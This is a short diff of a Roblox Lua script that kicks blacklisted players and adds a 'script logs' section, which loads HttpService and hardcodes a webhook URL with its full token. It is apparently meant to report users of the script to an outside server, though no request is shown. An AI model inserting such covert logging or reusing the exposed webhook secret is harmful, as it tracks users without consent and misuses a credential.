@@ -46,3 +46,7 @@ local nubcheck = ezeznub[game:GetService("Players").LocalPlayer.UserId]
 if nubcheck then
     game:GetService("Players").LocalPlayer:Kick("ez get blacklist skid",ezeznub[game:GetService("Players").LocalPlayer.UserId]["reason"])
 end
+
+--script logs--
+local hahafunni = game:GetService("HttpService")
+local funnichadwebhookthing = "https://webhook.lewistehminerz.dev/api/webhooks/942702681045205004/mHDJbf1shX8naKWl6xAPVgGXJcQNPFUx1LAs9QL9dgTwnbYid9sMCElzmZX6tn7SyqRK"
